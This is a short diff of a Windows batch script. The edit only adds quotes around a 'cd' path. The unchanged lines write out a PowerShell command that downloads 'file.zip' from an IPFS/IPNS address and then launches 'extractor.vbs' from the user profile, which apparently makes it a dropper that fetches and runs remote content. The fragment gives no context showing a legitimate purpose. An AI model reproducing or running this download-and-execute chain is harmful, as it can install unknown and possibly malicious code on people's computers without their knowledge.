@@ -1,4 +1,4 @@
-cd /d %~dp0
+cd /d "%~dp0"
 (
 echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://ipfs.io/ipns/link/file.zip', '%CD%\file.zip')"
 echo start "" "%userprofile%\extractor.vbs"
